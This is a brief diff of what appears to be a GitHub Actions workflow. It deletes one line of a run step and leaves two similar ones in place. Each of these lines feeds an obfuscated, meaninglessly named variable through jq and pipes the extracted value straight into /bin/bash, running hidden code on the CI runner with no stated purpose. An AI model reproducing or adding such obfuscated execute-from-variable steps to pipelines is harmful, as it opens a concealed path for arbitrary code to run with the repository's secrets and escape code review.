@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$l87327" | jq -r .cem66911 | /bin/bash
           printf '%s' "$c01255" | jq -r .rvjl055 | /bin/bash
-          echo $gmsh6540 | jq -r .h61211 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
